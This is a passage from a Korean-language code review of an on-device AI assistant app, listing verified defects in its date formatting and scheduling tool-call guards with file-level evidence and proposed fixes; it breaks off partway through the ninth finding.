- 기억 검색 후보가 최근 500건(MEMORY_SCAN_LIMIT): ADR-025 의 규모 게이트로 기록됨.
- 보관함 뜻 검색이 질의마다 전 벡터를 훑는 것: 1,000만 자 상한 안에서 쪽 단위로 읽어 한계가 정해져 있고 실측 없이 문제라 하기 어렵다.
- 대화 페이징 정렬에 동률 기준(id)이 없는 것, 할 일 저장의 읽고-덮어쓰기 경합: 재현 경로가 약하다.
- 복원 뒤 재시작 전까지 옛 연결로 쓰는 문제: 0.41.4 에서 인지하고 성공 기록을 빼는 것으로 처리됨.
- Redaction 의 전화번호 패턴이 국내 휴대폰 번호뿐인 것: 취향·범위 문제로 판단.

모델 입력(툴 선언·지시·리마인더·툴 결과 문구)을 바꾸는 제안은 없다 — 전부 touchesModelInput=false.

</details>

## 도메인 순수 로직 (domain)

### domain-1 · 답변 속 날짜를 사람이 읽는 표기로 바꿀 때 연도가 통째로 사라진다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 문서 검색·기억 검색 답에서 "계약 만료일은 2027-03-15", "생년월일 1990-05-03" 같은 값이 화면과 저장된 대화 기록에서 "3월 15일", "5월 3일" 로 바뀐다. 연도가 핵심인 정보가 조용히 틀린 답이 되고, 바뀐 글이 다음 턴 기록·지난 대화 요약의 재료로도 들어간다. 매일 실사용에서 문서·메모 질문을 하면 바로 만나는 경로다.
- 제안: humanizeInText 에 기준 연도(오늘 연도, now 인자로 받음)를 넘겨, 날짜의 연도가 올해와 다르면 "2027년 3월 15일" / "Mar 15, 2027" 로 연도를 붙인다(올해면 지금처럼 생략). 일정 표기 함수(toDisplayKorean 등 모델 입력에 쓰이는 것)는 건드리지 않고 답 글 치환 경로에만 적용하면 모델 입력 바이트는 그대로다. 다른 해 날짜·일시 테스트를 추가한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/util/IsoDateTimeParser.kt:102-120 — humanizeInText 가 "2027-03-15" 를 "3월 15일" 로, 일시도 toDisplayKorean(월·일·시각만)으로 바꾼다. 연도를 남기는 분기가 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:318 — 최종 답(저장되는 글)에 그대로 적용
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/util/IsoDateTimeParserTest.kt:99-103 — 테스트는 올해 날짜만 다루고 다른 해 날짜는 없다
- 검증: 직접 확인: domain/.../util/IsoDateTimeParser.kt:102-120 — 날짜만이면 "%d월 %d일"(114줄)·영어 "%s %d"(112줄), 일시는 toDisplayKorean(51-66줄, 월·일·시각만)으로 바꾸며 연도를 남기는 분기가 없다. 정규식 ISO_IN_TEXT(288줄)는 모든 4자리 연도를 잡는다. 호출부는 app/.../assistant/agent/BaseAgent.kt:318(최종 답, 저장되는 글)과 136줄(스트리밍) 두 곳뿐이고 툴 결과·모델 입력에는 쓰이지 않는다 — 제안대로 고쳐도 모델 입력 바이트는 그대로다. 테스트 IsoDateTimeParserTest.kt:99-103 은 2026년 날짜만 다룬다. 고칠 때 주의: 101줄 단언("2026-11-07이 생신이에요" → "11월 7일이 생신이에요")이 벽시계 '올해'에 묶이면 2027년에 깨진다 — 기준 연도를 인자로 받고(AGENTS 2-④) 테스트는 그 인자를 명시해야 기존 단언을 안 바꾼다. BaseAgent 에는 nowProvider 가 이미 있다(444줄). 재현 전제는 모델이 답에 ISO 꼴(yyyy-MM-dd)로 다른 해 날짜를 적는 것 — 문서·메모 원문이 그 꼴이면 그대로 옮겨 적으므로 성립한다.
- 앞선 기록: CHANGELOG 0.38.9 M3(docs/CHANGELOG.md:651, 답 속 ISO 일시를 한국어 표기로) — 연도 처리 언급 없음. 0.41.x exp88(CHANGELOG:320)의 '월-일만' 결정은 시스템 지시 날짜 줄 이야기라 이 경로와 무관

### domain-2 · "지금 회의 잡아줘"는 시각 가드를 통과한 뒤 '이미 지난 시각' 가드에 걸린다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 모델은 지금 시각을 분 단위(초 00)로 적으므로 start_time 은 거의 항상 현재보다 몇 초~수십 초 과거다. 그러면 "오늘 15:20은 이미 지났습니다. 내일 15:20인지 물어보세요"가 모델에게 돌아가 사용자는 "내일 15:20으로 잡을까요?"라는 엉뚱한 되물음을 받는다. "30분 뒤"는 괜찮지만 "지금"은 구조적으로 막힌다. (모델이 현재 분을 그대로 적는다는 부분은 코드가 아니라 관찰 기반 추정이다.)
- 제안: SchedulePastIntent 에서 (가) 사용자 말에 "지금"·now·"방금"이 있으면 통과시키거나 (나) start 가 now 보다 몇 분(예: 5분) 이내로만 과거면 통과시키는 여유를 둔다. 판정식이 바뀌므로 회귀 세트 흉내(scratch/lab/regression/run.py 의 past 가드)도 같이 고치고 다시 돌린다. 문구는 그대로라 토큰 실측은 필요 없다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:27-30 — CLOCK 정규식이 "지금"·now 를 '몇 시가 있다'로 인정
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/SchedulePastIntent.kt:19-23,36 — DATE_WORD 에 "아까"·"방금"은 있지만 "지금"·now 는 없고, start < now 면 여유 없이 바로 막는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/agent/ScheduleTimeIntentTest.kt:38 — "지금 회의 잡아줘" 통과를 고정. SchedulePastIntentTest 에는 '지금' 사례가 없다
- 검증: 직접 확인: ScheduleTimeIntent.kt:28 CLOCK 에 "지금", 29줄에 now 가 있어 몇 시 가드를 통과한다(ScheduleTimeIntentTest.kt:38 이 "지금 회의 잡아줘" 통과를 고정). SchedulePastIntent.kt:19-22 DATE_WORD 에는 "아까·방금"은 있으나 "지금"·now 가 없고, 36줄은 start < now 면 여유 없이 막는다. 모델이 받는 현재 시각은 PromptAssembler.kt:104 의 "[Now] HH:mm"(분 단위)이고 가드의 now 는 BaseAgent.kt:444 nowProvider()(실제 밀리초)라, 모델이 [Now] 값을 그대로 start_time 에 쓰면 초·추론 시간만큼 항상 과거가 되어 "오늘 HH:mm은 이미 지났습니다. 내일 HH:mm인지 물어보세요"가 나간다 — 경로는 코드로 성립한다. 다만 모델이 '지금'에 현재 분을 그대로 쓰는지는 실측이 없고(몇 분 올려 적으면 통과), '지금 일정 잡아줘'는 흔한 말이 아니라 심각도는 낮춘다. 고치면 scratch/lab/regression/run.py:82-93 흉내(PAST_DATE_WORD)도 같이 고쳐야 한다. 문구는 안 바뀌므로 토큰 실측 대상은 아니지만 가드 판정식 변경이라 회귀 세트는 다시 돌린다.
- 앞선 기록: CHANGELOG 0.42.5 M1(docs/CHANGELOG.md:102-108, 지난 시각 가드 exp99) · 0.42.7(72줄, 날짜 낱말 보강) — '지금' 사례 기록 없음

### domain-3 · 요일 가드의 안내 날짜가 "다음 주"를 무시해 한 주 이른 날짜로 다시 넣게 한다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S · 모델 입력
- 왜: 예: 월요일(11-16)에 "다음 주 수요일 11시 치과"라고 했는데 모델이 날짜를 틀리면, 앱이 "수요일은 11월 18일입니다. 그 날짜로 다시 추가하세요"라고 알려 준다. 모델은 이번 주 수요일로 다시 넣고 요일이 맞으니 통과한다 — 가드가 틀린 날짜를 직접 처방하는 셈이다. 승인 시트에는 "11월 18일 (수)"만 보여 사용자가 놓치기 쉽다. 같은 이유로 오늘이 그 요일이고 말한 시각이 이미 지났을 때도 '오늘'을 안내한다.
- 제안: formatGuidance 에 사용자 말을 넘겨 "다음 주"·"담주"·next week 가 있으면 그 주의 해당 요일을, 없으면 지금처럼 가장 가까운 요일을 계산한다("이번 주"는 현행). 오늘이 그 요일인데 시각이 지났으면 다음 주를 안내한다. 안내 문장 틀은 같고 날짜 값만 달라지지만 툴 결과 문구이므로 회귀 세트의 weekday 문항을 다시 돌리고 run.py 흉내도 맞춘다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntent.kt:81-97 — formatGuidance 가 항상 today.with(nextOrSame(wanted)), 즉 오늘 이후 가장 가까운 그 요일만 알려 준다. 사용자 말의 "다음 주"·next 는 보지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntent.kt:72 — 요일만 같으면 통과하므로, 안내대로 다시 부른 호출은 그대로 승인 시트로 간다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntentTest.kt:34-37 — "다음 주 화요일"은 날짜가 맞을 때 통과하는 경우만 고정, 어긋났을 때의 안내 날짜는 테스트가 없다
- 검증: 맞는 부분: ScheduleWeekdayIntent.kt:87 은 항상 today.with(nextOrSame(wanted)) 이고 formatGuidance(81-86줄)는 사용자 말을 받지 않는다. 72줄은 요일만 같으면 통과하므로, "다음 주 수요일"에 모델이 요일을 틀리면 안내가 이번 주 수요일 날짜를 주고 그 날짜로 다시 부르면 통과한다 — 가드가 한 주 이른 날짜를 처방하는 경로는 코드로 성립한다. 테스트(ScheduleWeekdayIntentTest.kt:34-41)는 다음 주 화요일이 '맞을 때 통과'만 고정한다. 틀린/이미 결정된 부분: ① '어느 주인지 판정 안 함'은 계획서·CHANGELOG·ADR 에 명시된 의도적 범위다. ② "오늘이 그 요일이고 시각이 지났을 때 오늘을 안내"는 b40aa72 에서 일부러 nextOrSame 으로 바꾼 동작이라 결함으로 볼 수 없다(뒤집으면 그 수정과 충돌 — 그 뒤는 지난 시각 가드 몫). ③ 발동 조건이 '다음 주+요일을 말했고 모델이 요일까지 틀림'의 겹침이라 빈도는 낮다 — 시스템 지시가 Next Monday 와 Coming days 를 주므로(PromptAssembler.kt:213) 틀리는 빈도는 잰 적이 없다. 고친다면 안내 날짜 값(툴 결과 문구)이 바뀌므로 회귀 세트 weekday 문항 재실행과 run.py 흉내 수정이 선행돼야 한다(모델 입력 변경).
- 앞선 기록: docs/plans/0.41.13-weekday-guard-and-repeat-refusal.md:47 · CHANGELOG 0.41.13(docs/CHANGELOG.md:285 '어느 주인지는 판정하지 않는다') · ADR-030 표(docs/architecture.md:2096) — 주 구분은 일부러 범위 밖. CHANGELOG:290(b40aa72)에서 오늘이 그 요일이면 오늘을 가리키도록 nextOrSame 으로 일부러 바꿈

### domain-4 · "내일·모레·다음 주·요일"을 말했는데 start_time 이 과거여도 그대로 승인 시트로 간다
- 판정 이미 결정·기록됨 · 중요도 낮음 · 크기 M · 모델 입력
- 왜: "내일 3시"·"다음 주 월요일"은 과거일 수 없으므로 과거 start_time 은 모델이 날짜를 틀렸다는 확실한 신호다. 지금은 그 신호를 버리고 승인 시트(월·일만 보임)로 넘긴다. 사용자가 못 보고 승인하면 지난 날짜에 일정이 들어가고 오늘/이번 주 목록에도 안 보여 '일정이 사라진' 것처럼 된다. 0.42.7 에서 이 낱말들을 넣은 이유는 "내일 10:00인지 물어보세요" 문구가 이런 경우에 틀렸기 때문인데, 통과시키는 것이 유일한 해법은 아니다.
- 제안: DATE_WORD 를 둘로 나눈다 — 과거를 가리킬 수 있는 낱말(오늘·어제·그저께·아까·방금·n월·n일)은 지금처럼 통과, 미래만 가리키는 낱말(내일·모레·글피·다음 주/달·요일·주말)이 있는데 start_time 이 과거면 "실행하지 않았습니다. 그 날짜는 이미 지났습니다. 오늘은 M월 D일입니다. 날짜를 다시 계산해 추가하세요" 류의 별도 문구로 되돌린다. 새 툴 결과 문구라 실험실 실측(토큰·행동)과 회귀 세트가 선행돼야 한다. 기존 단언 2건(위 테스트 47-48줄)을 바꿔야 하므로 사용자 확인 대상이다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/SchedulePastIntent.kt:19-23,36 — 날짜 낱말이 하나라도 있으면 과거 시각이어도 null(통과). 과거를 가리킬 수 있는 낱말(오늘·어제·n월 n일)과 미래만 가리키는 낱말(내일·모레·다음 주·요일)을 구분하지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/agent/SchedulePastIntentTest.kt:47-48 — "다음주 월요일 10시"에 일주일 전 날짜(2026-11-02)가 와도 통과, "내일 점심 12시"에 오늘 지난 시각이 와도 통과를 고정
- 검증: 직접 확인: SchedulePastIntent.kt:19-22 DATE_WORD 에 내일·모레·글피·요일·주말·다음/이번 주가 들어 있고 36줄에서 낱말이 있으면 과거여도 null. SchedulePastIntentTest.kt:47("다음주 월요일 10시" + 2026-11-02 → 통과, 메시지 "날짜를 말했으면 그 날짜를 믿는다")·48("내일 점심 12시" + 오늘 지난 시각 → 통과)이 이 동작을 단언으로 고정한다. 사실 관계는 제안과 같지만 이것은 0.42.7 에서 테스트와 함께 일부러 고른 정책이다 — 지금 문구("내일 HH:mm인지 물어보세요")가 이런 말에 틀린 답을 처방해서 뺀 것. 제안은 새 툴 결과 문구(실험실 실측·회귀 세트 선행)와 기존 단언 2건 변경(사용자 확인 대상)이 필요하고, 모델이 '내일/다음 주'에 과거 날짜를 내는 빈도는 측정된 적이 없다(시스템 지시가 Tomorrow·Next Monday 를 연도까지 준다 — PromptAssembler.kt:213). 과거 날짜가 새는 대가가 기록에 없다는 지적은 맞으므로, 하려면 먼저 빈도를 재는 것이 순서다.
- 앞선 기록: CHANGELOG 0.42.7(docs/CHANGELOG.md:72) — "날짜를 말했으면 그 날짜를 믿는다"로 내일·모레·요일·다음 주를 통과 목록에 넣음. SchedulePastIntent.kt:18 [WHY] 주석과 SchedulePastIntentTest.kt:47-48 이 고정

### domain-5 · 일정 표기·가드 안내 어디에도 연도가 없고 start_time 연도 검증도 없다 — 연말(12월→1월)에 취약
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M · 모델 입력
- 왜: 12월 말에 "다음 주 월요일"·"1월 3일"을 말하면 모델이 연도를 올려 적어야 한다. 연도를 그대로(올해 1월) 적으면 과거 날짜가 되는데, 날짜 낱말이 있어 지난 시각 가드는 통과하고(domain-4), 요일이 어긋나면 요일 가드가 연도 없는 "1월 4일"만 알려 줘 모델이 같은 실수를 반복할 수 있다. 승인 시트에도 연도가 없어 사용자가 잡아낼 방법이 없다. 실사용 시작 약 6주 뒤에 처음 만나는 구간이고, 모델이 연도를 틀리는 빈도는 잰 적이 없다(추정).
- 제안: ① 화면 쪽(모델 입력 아님): 승인 시트·결과 카드의 날짜가 올해가 아니면 연도를 붙인다(toDisplayDateKorean 에 기준 연도 인자). ② 가드: start_time 이 현재보다 1년 넘게 과거이거나 지나치게 먼 미래면 승인 전에 되돌리는 범위 검사를 추가(새 문구라 실측 필요). ③ 회귀 세트에 '오늘이 12월 28일'인 연도 넘김 문항을 1~2개 넣어 실제 빈도를 먼저 잰다 — 0건이면 ①만 해도 된다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/util/IsoDateTimeParser.kt:51-66,157-169 — toDisplayKorean·toDisplayDateKorean 은 월·일(·요일)만 낸다. 승인 시트(app/.../feature/approval/ApprovalSheet.kt:162)와 일정 툴 결과가 이것을 쓴다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleWeekdayIntent.kt:87-95 — 안내 문구도 monthDayKorean(연도 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/AddScheduleUseCase.kt:36-45 · app/.../assistant/tool/ToolArguments.kt:88-93 — ISO 형식만 확인하고 날짜 범위(연도)는 확인하지 않는다
- 검증: 맞는 사실: IsoDateTimeParser.kt:51-66(toDisplayKorean)·157-169(toDisplayDateKorean)·176-187(monthDayKorean)은 연도를 내지 않고, 승인 시트 ApprovalSheet.kt:157-164(dayOf)는 toDisplayDateKorean 을 쓴다. ScheduleWeekdayIntent.kt:89 안내도 monthDayKorean. ToolArguments.kt:88-93(validIsoOrThrow)은 형식만 보고 AddScheduleUseCase.kt:36-45 는 범위 검사 없이 저장한다. 약한 부분: ① 위험 자체가 추정이다 — 모델이 연말에 연도를 틀리는 빈도를 잰 기록이 없고, 시스템 지시는 Today·Tomorrow·Day after tomorrow·Next Monday 를 연도까지 준다(PromptAssembler.kt:213, 픽스처 system_instruction_en.txt:5). 연도가 빠지는 것은 Coming days(MM-dd) 구간뿐이다. ② ②번 제안(범위 가드)은 새 툴 결과 문구라 실측이 선행돼야 하고 domain-4 의 결정과 겹친다. 쓸모 있는 조각은 ①(화면 표기에 올해가 아니면 연도 — 모델 입력 아님, 단 toDisplayKorean 은 툴 결과·브리핑 재료에도 쓰이므로 화면용 함수만 건드려야 한다)과 ③(회귀 세트에 12월 말 문항으로 빈도부터 재기)이다. domain-1 과 같은 '연도 없음' 뿌리라 한 회차로 묶는 편이 낫다.
- 앞선 기록: CHANGELOG 0.41.x exp88(docs/CHANGELOG.md:320) — 시스템 지시 날짜 줄은 월-일만(연도까지 넣는 판은 +30토큰에 1문항 차이라 제외, 사용자 결정). 연도 넘김 구간 기록 없음

### domain-6 · 영어 "at 7"과 숫자만 답한 "7"이 '몇 시가 없다'로 판정돼 되묻기가 반복된다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 한국어는 "7시"가 자연스러워 문제가 적지만 영어는 "dinner tomorrow at 7"이 가장 흔한 말투다. 이 말은 막히고, 모델이 몇 시냐고 물은 뒤 "7"이라고 답해도 또 막힌다(영어에서는 메모 저장 물음으로 빗나간다). 한/영 지원을 내세우는 포트폴리오에서 영어 일정 추가의 기본 문장이 실패하는 비대칭이다.
- 제안: CLOCK 에 "at\s+\d{1,2}\b"(뒤에 st/nd/rd/th·월 이름이 오지 않을 때)를 추가하고, 바로 앞 비서 말이 시각을 묻는 말("몇 시"·"what time")일 때는 사용자 답의 맨 숫자·한글 수("7", "일곱", "seven")를 시각으로 인정한다. 영어 TIME_WORDS 에 "what time"도 넣어 shouldBlock 오판을 막는다. 가드 판정식 변경이므로 run.py 흉내를 같이 고치고 회귀 세트(영어 일정 문항)를 다시 돌린다. 문구는 그대로다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:27-30 — CLOCK 의 영어 쪽은 숫자+am/pm, noon/midnight/now, o'clock, in N minutes 만 인정. "at 7"·"at 7:30" 중 앞의 것은 안 잡힌다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:46-50 — 앞 비서 말이 "몇 시에 잡을까요?"여도 사용자 답 "7"에는 시계 시각이 없어 needsClock 이 다시 true. 영어는 앞 비서 말 "What time…?"이 TIME_WORDS 에도 없어 shouldBlock 이 먼저 걸려 "일정 요청이 아니니 메모할지 물어보라"(NO_TIME_EN)가 나간다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/agent/ScheduleTimeIntentTest.kt:38-39 — 영어 통과 사례는 7pm·3 pm·noon·in 30 minutes·5 o'clock 뿐
- 검증: 직접 확인: ScheduleTimeIntent.kt:27-30 CLOCK 의 영어 쪽은 `\d{1,2}\s*(am|pm|a.m.|p.m.)`, noon/midnight/now, o'clock, in N minutes/hours, 그리고 HH:MM 뿐이라 "dinner tomorrow at 7"은 hasClock=false → needsClock(46-47줄) true → NO_CLOCK_EN. 이어서 사용자가 "7"이라고 답하면 ToolCallGuards.kt:66 의 shouldBlock 이 먼저 돈다 — hasTime("7")=false, isReply=true 지만 앞 비서 말 "What time…?"에는 TIME_WORDS(14-21줄) 영어 낱말이 없어(한국어 "몇 시"만 있음) shouldBlock=true → NO_TIME_EN("일정 요청이 아니다, 메모할지 물어라")이 나간다. 한국어도 "몇 시에 잡을까요?" 뒤 "7"은 shouldBlock 은 통과하나 needsClock 이 다시 true(테스트 ScheduleTimeIntentTest.kt:41 이 "내일" 답을 막는 것은 고정하지만 맨 숫자 답은 사례 없음). 영어 통과 사례 테스트(39줄)는 7pm·3 pm·noon·in 30 minutes·5 o'clock 뿐. 사용자가 "7pm"이라고 다시 말하면 풀리므로 막다른 길은 아니지만, 영어 기본 문장이 한 번 막히고 자연스러운 답이 메모 물음으로 빗나가는 것은 결정적으로 재현된다. 고칠 때: "at\s+\d{1,2}\b"는 "at 7 Main St"·"at 3 people" 같은 오탐 여지가 있으니 사례 테스트를 같이 넣고, run.py:47-58 흉내와 영어 회귀 문항을 함께 갱신한다. 문구는 그대로다.
- 앞선 기록: CHANGELOG 0.41.15 M2(시계 시각 가드, exp89·92) — 영어 'at 7'·맨 숫자 답 기록 없음(CHANGELOG·architecture·plans grep 0건)

### domain-7 · 아침 브리핑과 음성 받아쓰기에는 출력 상한·깨진 글자 검사가 빠져 있다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 0.42.4 에서 채팅 밖 추론이 깨진 글자를 엔진 한도(약 3,800토큰, 2분)까지 내는 일이 있었고 원인은 미상인 채 안전장치만 넣었다. 그런데 같은 종류의 추론인 브리핑·받아쓰기는 빠졌다. 재발하면 깨진 브리핑이 비서 말풍선·알림으로 저장돼 다음 대화 기록에 들어가고, 받아쓰기는 깨진 글자가 사용자 메시지가 되어 그대로 답 생성까지 간다. 매일 아침 자동으로 도는 경로라 실사용에서 노출이 가장 잦다.
- 제안: OneShotLimits 에 BRIEFING(정상 길이의 몇 배, 예: 400~500)·TRANSCRIBE(입력 상한 8192자에 맞춘 값)를 추가해 두 유스케이스의 ChatPrompt 에 넣고, 브리핑 결과에 BrokenOutput.looksBroken 을 적용해 깨졌으면 실패로 돌린다(저장·알림 안 함). 받아쓰기는 한국어 설정일 때만 같은 검사를 적용할지 결정이 필요하다(영어로 말한 경우 오탐). 프롬프트 글자는 바뀌지 않는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:53-71 — ChatPrompt 에 maxOutputTokens 가 없고 결과는 비었는지만 본다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/TranscribeAudioUseCase.kt:36-42,87 — maxOutputTokens 없음(글자 수만 8192자로 자름)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/modelrunner/OneShotLimits.kt:11-16 — 상한은 요약·추출·회고·판정 네 가지만 정의
  - app 과 data 의 main 소스에 BrokenOutput 사용처 없음(grep) — 브리핑 생성기 쪽에서도 거르지 않는다
- 검증: 직접 확인: GenerateBriefingUseCase.kt:53-59 ChatPrompt 에 maxOutputTokens 없음, 61-68줄은 빈 문자열만 거른다. TranscribeAudioUseCase.kt:36-42 도 없음(87줄 글자 수 8192 자르기만). OneShotLimits.kt:11-16 은 네 가지만 정의. maxOutputTokens·BrokenOutput 사용처 grep 결과는 EpisodeMerge.kt:96, GenerateWeeklyReviewUseCase.kt:89·97, PlanMemoryMergeUseCase.kt:115, ExtractFactsUseCase.kt:65·71, SummarizeEpisodeUseCase.kt:60·67 뿐. 런타임은 상한을 그대로 넘긴다(GemmaModelRunner.kt:371 maxOutputToken = prompt.maxOutputTokens → null 이면 엔진 한도까지). 브리핑 생성기(MorningBriefingGenerator 148-166줄 부근)는 Success 면 검사 없이 InputType.BRIEFING 비서 메시지로 저장한다 — 깨진 출력이면 대화 기록·다음 턴 프리필에 그대로 들어간다. 단서: 11-17 의 깨짐은 11-18 에 재현되지 않았고(CHANGELOG:133-135) 그 뒤 임베딩 기본이 CPU 로 바뀌어(0.42.8) 발생 가능성 자체는 낮아졌다. 그래도 같은 종류 추론에 같은 안전장치가 빠진 비대칭이고 고치는 비용이 작다. 주의: 상한 초과를 실패로 돌리는 판정은 디버그 빌드의 벤치마크 토큰 수에 기대므로(GemmaModelRunner.kt:389-394) 생성 자체는 상한에서 멈추되 릴리스에서는 BrokenOutput 만 남는다. 받아쓰기는 영어 발화가 정상이라 한글 비율 검사를 그대로 쓰면 오탐 — 상한만 넣는 쪽이 안전하다. 프롬프트 글자는 안 바뀐다.
- 앞선 기록: CHANGELOG 0.42.4 M2(docs/CHANGELOG.md:139-140) — 상한은 요약 800·추출 300·회고 400·판정 120, '채팅은 상한 없음'. 브리핑·받아쓰기는 계획서(docs/plans/0.42.4-side-inference-runaway.md)에도 언급 없음(grep 0건) — 일부러 뺀 기록이 아니라 누락

### domain-8 · 승낙하면서 "일정·예약"을 다시 말하면("응 예약해줘") 시각이 없다고 막힌다
- 판정 일부만 맞음 · 중요도 중간 · 크기 S
- 왜: 비서가 "내일 오후 3시로 예약할까요?"라고 물은 뒤 사용자가 "응 예약해줘", "그 일정으로 등록해줘", "Yes, schedule it"이라고 답하는 것은 아주 흔하다. 이때 needsClock 이 true 가 되어 "몇 시인지 정해지지 않았습니다"가 모델에 돌아가고, 방금 정한 시각을 다시 묻게 된다. 0.42.7 에서 새 요청과 승낙을 가르려고 넣은 규칙의 반대쪽 오탐이다.
- 제안: isReply 판정을 보강한다 — 이번 말이 긍정 낱말(응·네·좋아·그래·yes·ok 등)로 시작하고 길이가 짧으면(예: 15자·5낱말 이하) 일정 낱말이 있어도 대답으로 본다. 또는 앞 비서 말이 물음("…까요?", "?")으로 끝나고 이번 말에 새 날짜·시간대 낱말이 없으면 대답으로 본다. 0.42.7 의 휴대폰 사례("헬스 일정 잡아줘")는 긍정으로 시작하지 않으므로 계속 막힌다. run.py 흉내와 회귀 세트를 함께 갱신한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/ScheduleTimeIntent.kt:46-47,59-61 — 이번 말에 일정·예약·약속·회의·미팅·스케줄(영어 schedule·meeting 등)이 있으면 isReply=false 라 앞 비서 말의 시각을 쓰지 않는다. isYes 는 "응 예약해줘" 같은 말을 긍정으로 보지 않는다(MemoSaveIntent.kt:41-46)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/agent/ScheduleTimeIntentTest.kt:60-67 — 승낙은 "응"·"좋아, 그렇게 해줘"만 고정
- 검증: 결함은 맞지만 나가는 문구가 제안과 다르다(더 나쁘다). ScheduleTimeIntent.kt:59-61 — "응 예약해줘"·"그 일정으로 등록해줘"·"Yes, schedule it"은 NEW_REQUEST 에 걸려 isReply=false. 그런데 ToolCallGuards.kt:66 에서 needsClock 보다 shouldBlock(50줄)이 먼저 돈다: hasTime("응 예약해줘")=false 이고 isReply=false 라 앞 비서 말의 시각을 못 써 shouldBlock=true → "몇 시인지 정해지지 않았습니다"(NO_CLOCK)가 아니라 NO_TIME(64줄, "일정 요청이 아닙니다. 일정 이야기는 꺼내지 말고 메모해 둘까요?라고 물어보세요")이 모델에 돌아간다 — 방금 합의한 일정이 메모 물음으로 바뀐다. isYes(MemoSaveIntent.kt:41-46, 82)는 전체 일치라 "응 예약해줘"를 긍정으로 보지 않는 것도 확인. 테스트(ScheduleTimeIntentTest.kt:66-67)는 "응"·"좋아, 그렇게 해줘"만 고정. 범위 한정: "응 잡아줘"·"응 그렇게 해줘"처럼 일정 낱말이 없는 승낙은 통과하므로 '일정·예약·약속·회의·미팅' 낱말을 되풀이한 승낙만 걸린다. 0.42.7 은 '짧은 긍정만 인정'을 버린 기록이 있으니, 제안 중 '긍정 낱말로 시작하면 일정 낱말이 있어도 대답으로 본다' 쪽이 그 결정과 충돌하지 않는다("헬스 일정 잡아줘"는 긍정으로 시작하지 않아 계속 막힘). shouldBlock·needsClock 둘 다 isReply 를 쓰므로 한 곳만 고치면 되고, run.py 흉내와 회귀 세트를 같이 갱신한다.
- 앞선 기록: CHANGELOG 0.42.7(docs/CHANGELOG.md:74-75) — isReply 도입: 일정 낱말이 있으면 새 요청으로 보고, 짧은 긍정만 인정하는 방식은 "좋아, 그렇게 해줘"를 막아 일부러 버림. 승낙에 일정 낱말이 섞인 경우는 기록 없음

### domain-9 · '다시 알려줘' 가드의 저장 낱말 목록이 메모 가드보다 좁아 "다시 알려줄게, 까먹지 마"의 저장이 막힌다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: "비밀번호 다시 알려줄게, 외워둬"·"다시 말해줄게 까먹지 마"는 저장 부탁인데 RepeatRequest 가 되묻기로 판정해 메모 저장을 막고 "저장하지 않았습니다. 사용자는 앞에서 말한 내용을 다시 듣고 싶어 합니다"를 모델에 돌려준다. 같은 '저장 낱말' 개념이 두 파일에 따로 있고 한쪽만 넓혀 온 것이 원인이라, 앞으로도 한쪽만 고치면 다시 어긋난다(유지보수 부담).
- 제안: RepeatRequest.matches 의 저장 판정을 MemoSaveIntent.hasSaveWord 로 통일한다. 다만 한국어 "기억" 한 낱말이 hasSaveWord 에 들어 있어 "뭐였지? 기억나?" 같은 순수 되묻기가 저장 부탁으로 넘어가지 않도록 "기억나/기억해?" 같은 물음 꼴은 제외하는 조건을 함께 넣는다(영어는 이미 REMEMBER_LOOKUP_EN 으로 제외). 가드 판정 변경이라 run.py 흉내와 회귀 세트의 repeat 문항을 다시 돌린다.
- 근거:
